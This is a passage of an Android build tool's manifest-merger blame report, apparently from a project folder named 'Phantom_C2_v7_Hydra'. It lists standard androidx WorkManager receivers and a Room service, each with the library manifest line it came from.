+147-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:97:25-79
+148            </intent-filter>
+149        </receiver>
+150        <receiver
+150-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:100:9-109:20
+151            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy"
+151-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:101:13-103
+152            android:directBootAware="false"
+152-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:102:13-44
+153            android:enabled="false"
+153-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:103:13-36
+154            android:exported="false" >
+154-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:104:13-37
+155            <intent-filter>
+155-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:106:13-108:29
+156                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+156-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:107:17-79
+156-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:107:25-76
+157            </intent-filter>
+158        </receiver>
+159        <receiver
+159-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:110:9-121:20
+160            android:name="androidx.work.impl.background.systemalarm.RescheduleReceiver"
+160-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:111:13-88
+161            android:directBootAware="false"
+161-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:112:13-44
+162            android:enabled="false"
+162-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:113:13-36
+163            android:exported="false" >
+163-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:114:13-37
+164            <intent-filter>
+164-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:116:13-120:29
+165                <action android:name="android.intent.action.BOOT_COMPLETED" />
+165-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:24:17-79
+165-->C:\Users\bbyra\Downloads\Phantom_C2_v7_Hydra\Phantom_C2_v7_Hydra\app\src\main\AndroidManifest.xml:24:25-76
+166                <action android:name="android.intent.action.TIME_SET" />
+166-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:118:17-73
+166-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:118:25-70
+167                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
+167-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:119:17-81
+167-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:119:25-78
+168            </intent-filter>
+169        </receiver>
+170        <receiver
+170-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:122:9-131:20
+171            android:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver"
+171-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:123:13-99
+172            android:directBootAware="false"
+172-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:124:13-44
+173            android:enabled="@bool/enable_system_alarm_service_default"
+173-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:125:13-72
+174            android:exported="false" >
+174-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:126:13-37
+175            <intent-filter>
+175-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:128:13-130:29
+176                <action android:name="androidx.work.impl.background.systemalarm.UpdateProxies" />
+176-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:129:17-98
+176-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:129:25-95
+177            </intent-filter>
+178        </receiver>
+179        <receiver
+179-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:132:9-142:20
+180            android:name="androidx.work.impl.diagnostics.DiagnosticsReceiver"
+180-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:133:13-78
+181            android:directBootAware="false"
+181-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:134:13-44
+182            android:enabled="true"
+182-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:135:13-35
+183            android:exported="true"
+183-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:136:13-36
+184            android:permission="android.permission.DUMP" >
+184-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:137:13-57
+185            <intent-filter>
+185-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:139:13-141:29
+186                <action android:name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS" />
+186-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:140:17-88
+186-->[androidx.work:work-runtime:2.9.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\023d7cb23ea6452de016b264b44127d9\transformed\work-runtime-2.9.0\AndroidManifest.xml:140:25-85
+187            </intent-filter>
+188        </receiver>
+189
+190        <service
+190-->[androidx.room:room-runtime:2.5.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\72ef62f2d94aaf54d83a44ae6a0144c5\transformed\room-runtime-2.5.0\AndroidManifest.xml:24:9-28:63
+191            android:name="androidx.room.MultiInstanceInvalidationService"
+191-->[androidx.room:room-runtime:2.5.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\72ef62f2d94aaf54d83a44ae6a0144c5\transformed\room-runtime-2.5.0\AndroidManifest.xml:25:13-74
+192            android:directBootAware="true"
+192-->[androidx.room:room-runtime:2.5.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\72ef62f2d94aaf54d83a44ae6a0144c5\transformed\room-runtime-2.5.0\AndroidManifest.xml:26:13-43
+193            android:exported="false" />
+193-->[androidx.room:room-runtime:2.5.0] C:\Users\bbyra\.gradle\caches\8.8\transforms\72ef62f2d94aaf54d83a44ae6a0144c5\transformed\room-runtime-2.5.0\AndroidManifest.xml:27:13-37
+194    </application>
+195
+196</manifest>
